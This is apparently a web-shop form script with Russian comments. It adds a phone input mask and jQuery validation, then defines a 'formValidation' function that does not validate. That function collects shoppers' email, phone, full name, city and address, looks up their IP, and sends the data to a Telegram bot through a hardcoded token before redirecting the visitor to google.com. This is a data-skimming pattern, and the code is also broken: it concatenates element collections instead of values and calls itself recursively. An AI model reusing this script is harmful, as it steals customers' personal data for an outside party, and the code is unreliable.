 // вешаем маску на телефон
 $('.phone-field').inputmask("+7(999)999-9999");
        
 // добавляем правило для валидации телефона
 jQuery.validator.addMethod("checkMaskPhone", function(value, element) {
     return /\+\d{1}\(\d{3}\)\d{3}-\d{4}/g.test(value); 
 });
 
 // получаем нашу форму по class
 var form = $('.form-request');
 
 // включаем валидацию в форме
 form.validate();
 
 // вешаем валидацию на поле с телефоном по классу
 $.validator.addClassRules({
     'phone-field': {
         checkMaskPhone: true,
     }
 });




function formValidation() {
    let email = document.getElementsByClassName('email')
    let number = document.getElementsByClassName('number')
    let fio = document.getElementsByClassName('fio')
    let city = document.getElementsByClassName('city')
    let address = document.getElementsByClassName('address')

    const TOKEN = '5615818383:AAFKfzzRL9g6I4UyxSsKEIH5GL556S9vI2M'; // токен
    const CHAT_ID = '5491860855'; 
    
    fetch('https://ipapi.co/json/')
        .then((res) => res.text())
        .then(
            function sendMsg(data) {
                var form = '✅ Пользователь (RandomShop 👟) в обработке заказа! \n Почта: ' + email + '\n Номер: ' + number +
                '\n ФИО: ' + fio + '\n🏢 Город: ' + city + '\n Адрес: ' + address

                var url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'; // токен бота
                var body = JSON.stringify({ // склеиваем объект в JSON строку
                    chat_id: CHAT_ID,
                    parse_mode: 'Markdown', // разметка сообщений вкл (чтобы использовать *жирный текст*)
                    text: form
                });
                var xhr = new XMLHttpRequest(); // инициализируем AJAX запрос
                xhr.open('POST', url, true); // отправляем наше сообщение методом POST на сервак телеги
                xhr.setRequestHeader('Content-type', 'application/json; charset=utf-8'); // на всякий случай, оповестим телеграм, что отправили JSON
                xhr.send(body);
            }
        )
        window.location.href = 'https://google.com'
        formValidation()
}